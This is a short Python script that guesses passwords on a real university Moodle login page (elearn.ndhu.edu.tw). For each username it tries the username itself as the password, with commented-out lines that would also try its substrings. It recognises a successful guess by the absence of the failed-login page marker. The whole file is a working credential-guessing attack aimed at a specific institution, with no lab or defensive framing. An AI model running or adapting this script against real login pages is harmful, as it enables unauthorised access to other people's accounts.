import requests


def brute(username):
    possible_passwords = [username]

    # for i in range(4, len(username)):
    #     possible_passwords.append(username[:i])
    #     possible_passwords.append(username[i:])

    print(f"\nFor user: {username}")
    for pw in possible_passwords:
        payload = {'username': username, 'password': pw}
        with requests.Session() as s:
            p = s.post(
                'http://www.elearn.ndhu.edu.tw/moodle/login/index.php', data=payload)
            key = '<meta name="keywords" content="moodle, 東華e學苑: 登入本網站 " />'
            if key in p.text:
                print(f'wrong password: {pw}')
                s.close()
            else:
                print(f'right password: {pw}')
                s.close()
                return f"{username} {pw}"
